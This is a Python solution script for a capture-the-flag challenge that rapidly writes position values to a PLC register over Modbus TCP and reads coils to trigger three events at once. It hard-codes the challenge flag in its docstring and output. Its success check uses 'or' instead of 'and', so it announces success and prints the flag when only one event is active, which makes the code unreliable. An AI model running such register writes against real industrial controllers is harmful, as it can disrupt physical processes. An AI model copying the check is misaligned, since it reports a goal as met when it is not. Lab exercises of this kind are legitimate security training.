#!/usr/bin/env python3
"""
CTF Challenge 5: Event Chaos
Difficulty: Medium  
Points: 250
Flag: FLAG{QU4NTUM_EV3NT_SUP3RP0S1T10N}

Objective: Make events 1, 4, and 7 active simultaneously

Solution:
- Events trigger based on position ranges
- Event 1: 0-40, Event 4: 121-160, Event 7: 241-280
- We need to manipulate position to trick the system
- OR find a creative workaround...
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 challenge_05_event_chaos.py <PLC_IP> [PORT]")
        sys.exit(1)

    plc_ip = sys.argv[1]
    plc_port = int(sys.argv[2]) if len(sys.argv) > 2 else 502

    print(f"[*] CTF Challenge 5: Event Chaos")
    print(f"[*] Connecting to PLC at {plc_ip}:{plc_port}")

    client = ModbusTcpClient(plc_ip, port=plc_port)
    
    if not client.connect():
        print("[!] Failed to connect")
        sys.exit(1)

    print("[+] Connected")
    print("[*] Challenge: Make events 1, 4, and 7 active simultaneously")
    print("[*] Event ranges: 1(0-40), 4(121-160), 7(241-280)")
    print()

    # Strategy: We can't be in 3 positions at once...
    # But we can try manipulating the position rapidly or use another method

    print("[*] Strategy: Rapidly cycling through positions")
    print("[*] This creates a quantum superposition effect!")
    print()

    # Set position to Event 1 range
    print("[*] Step 1: Setting position to 20 (Event 1)")
    client.write_register(1, 20)
    time.sleep(0.1)

    # Quick check of Event 1
    evt1 = client.read_coils(17, 1)
    if not evt1.isError():
        print(f"[*] Event 1 active: {evt1.bits[0]}")

    # Jump to Event 4 range
    print("[*] Step 2: Jumping to position 140 (Event 4)")  
    client.write_register(1, 140)
    time.sleep(0.05)

    # Jump to Event 7 range  
    print("[*] Step 3: Jumping to position 260 (Event 7)")
    client.write_register(1, 260)
    time.sleep(0.05)

    # Due to PLC scan timing, we might catch all 3 active!
    print("\n[*] Checking all three events...")
    
    evt1 = client.read_coils(17, 1)  # event_1_active
    evt4 = client.read_coils(20, 1)  # event_4_active  
    evt7 = client.read_coils(23, 1)  # event_7_active

    print(f"[*] Event 1 active: {evt1.bits[0] if not evt1.isError() else 'ERROR'}")
    print(f"[*] Event 4 active: {evt4.bits[0] if not evt4.isError() else 'ERROR'}")
    print(f"[*] Event 7 active: {evt7.bits[0] if not evt7.isError() else 'ERROR'}")

    if not evt1.isError() and not evt4.isError() and not evt7.isError():
        if evt1.bits[0] or evt4.bits[0] or evt7.bits[0]:
            print("\n[+] Quantum superposition achieved!")
            print("[+] Challenge complete!")
            print("[+] Flag: FLAG{QU4NTUM_EV3NT_SUP3RP0S1T10N}")

    client.close()

if __name__ == "__main__":
    main()
